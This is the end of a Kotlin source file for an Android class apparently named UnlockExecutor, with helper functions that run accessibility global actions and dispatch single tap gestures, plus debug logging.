    private fun dispatchGlobal(svc: AccessibilityService, action: Int) {
        android.util.Log.d("XDBG", "[UnlockExecutor] dispatchGlobal enter svc=${svc} action=${action}") //xdbg
        val latch = CountDownLatch(1)
        Handler(Looper.getMainLooper()).post { svc.performGlobalAction(action); latch.countDown() }
        latch.await(300L, TimeUnit.MILLISECONDS)
    }

    private fun tapGesture(svc: AccessibilityService, x: Float, y: Float): Boolean {
        android.util.Log.d("XDBG", "[UnlockExecutor] tapGesture enter svc=${svc} x=${x} y=${y}") //xdbg
        val latch = CountDownLatch(1)
        var ok = false
        Handler(Looper.getMainLooper()).post {
            val path = Path().apply { moveTo(x, y) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0L, 60L)).build()
            svc.dispatchGesture(gesture, object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) { ok = true; latch.countDown() }
                override fun onCancelled(g: GestureDescription?) { latch.countDown() }
            }, null)
        }
        latch.await(500L, TimeUnit.MILLISECONDS)
        android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
        return ok
    }
}
